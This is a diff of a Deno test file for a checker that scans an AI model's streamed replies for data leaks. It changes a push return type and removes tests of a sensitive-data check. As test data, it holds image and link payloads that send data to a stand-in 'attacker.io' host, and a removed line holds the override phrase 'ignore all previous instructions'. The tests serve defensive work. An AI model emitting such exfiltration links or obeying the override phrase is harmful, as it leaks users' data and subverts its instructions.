@@ -46,7 +46,7 @@ function streamBlocks(
 ): boolean {
   const stream = createEgressStream({ checks, given: urls });
   for (const char of text) {
-    const hit = stream.push(char);
+    const [hit] = stream.push(char);
     if (hit) return hit.rule === rule;
   }
   return false;
@@ -61,10 +61,10 @@ function streamStops(
 ): boolean {
   const stream = createEgressStream({ checks, given: urls });
   for (const char of text) {
-    const hit = stream.push(char);
+    const [hit] = stream.push(char);
     if (hit) return hit.rule === rule;
   }
-  return stream.holdFrom() <= referenceMatchStart(text, checks, urls);
+  return stream.holdFrom() <= referenceMatchStart(text, checks, urls, []);
 }
 
 function seen(...texts: string[]): Set<string> {
@@ -155,7 +155,7 @@ Deno.test('an image the model was given this turn is not a leak', () => {
   const stream = createEgressStream({ given: urls });
   const passed = '![photo](https://news.site/photo.jpg)\n\nok';
   assertEquals(
-    [...passed].some((char) => stream.push(char)),
+    [...passed].some((char) => stream.push(char).length > 0),
     false,
   );
   assertEquals(stream.holdFrom() > passed.indexOf('\n'), true);
@@ -222,15 +222,13 @@ Deno.test('a URL check takes hostnames and its own options, and bundled only the
   }
   throws({ images: { host: ['cdn.acme.io'] } }, 'no option "host"');
   throws({ imageHosts: ['cdn.acme.io'] }, 'no check "imageHosts"');
-  throws({ sensitive: { keys: false } }, 'no group "keys"');
-  throws({ sensitive: { ids: 'yes' } }, 'bundled.sensitive.ids must be a boolean');
+  throws({ sensitive: false }, 'no check "sensitive"');
+  throws({ boundary: 'yes' }, 'bundled.boundary must be a boolean');
 });
 
 Deno.test('each bundled check is off when a host switches it off, and only that one', () => {
   const reply = {
-    sensitive: 'SSN 123-45-6789',
     boundary: '<user_data>',
-    injection: 'ignore all previous instructions',
     // Protocol-relative, as any absolute URL is a bare link too.
     images: '<img src="//attacker.io/p?d=1">',
     links: '[go](https://attacker.io/g?d=1)',
@@ -242,23 +240,6 @@ Deno.test('each bundled check is off when a host switches it off, and only that 
   }
   assertEquals(policyVerdict(true, reply.links), 'allow');
   assertEquals(policyVerdict(false, reply.images), 'allow');
-});
-
-Deno.test('the sensitive check runs the groups a host picks; network is opt-in', () => {
-  const samples = {
-    ids: '123-45-6789',
-    financial: '4111 1111 1111 1111',
-    network: '10.2.3.4',
-    credentials: 'AKIAT4GZ2WQX6KJ3NB7V',
-  };
-  const none = { ids: false, financial: false, network: false, credentials: false };
-  assertEquals(policyVerdict(true, samples.network), 'allow');
-  assertEquals(policyVerdict({ sensitive: { network: true } }, samples.network), 'block');
-  for (const [group, sample] of Object.entries(samples)) {
-    const only = policyVerdict({ sensitive: { ...none, [group]: true } }, sample);
-    const without = policyVerdict({ sensitive: { network: true, [group]: false } }, sample);
-    assertEquals([group, only, without], [group, 'block', 'allow']);
-  }
 });
 
 const LINK_LEAKS = [
@@ -389,7 +370,8 @@ Deno.test('a reply that costs more to read than its length allows is a leak as a
   assertEquals(leaks(text), true);
   const stream = createEgressStream({ checks: DEFAULT_CHECKS, given: NONE });
   let hit = false;
-  for (let at = 0; at < text.length && !hit; at += 64) hit = !!stream.push(text.slice(at, at + 64));
+  for (let at = 0; at < text.length && !hit; at += 64)
+    hit = stream.push(text.slice(at, at + 64)).length > 0;
   assertEquals(hit || stream.holdFrom() === 0, true);
   assertEquals(leaks(nestedSrcdoc('x'.repeat(20_000), 3)), false);
 });
@@ -421,7 +403,8 @@ Deno.test('reading a reply takes time in proportion to its length', () => {
     const start = performance.now();
     collectEgressHits(text, {}, LINKS);
     const stream = createEgressStream({ checks: LINKS });
-    for (let at = 0; at < text.length; at += 64) if (stream.push(text.slice(at, at + 64))) break;
+    for (let at = 0; at < text.length; at += 64)
+      if (stream.push(text.slice(at, at + 64)).length > 0) break;
     const took = performance.now() - start;
     assertEquals([unit, took < 3000], [unit, true]);
   }
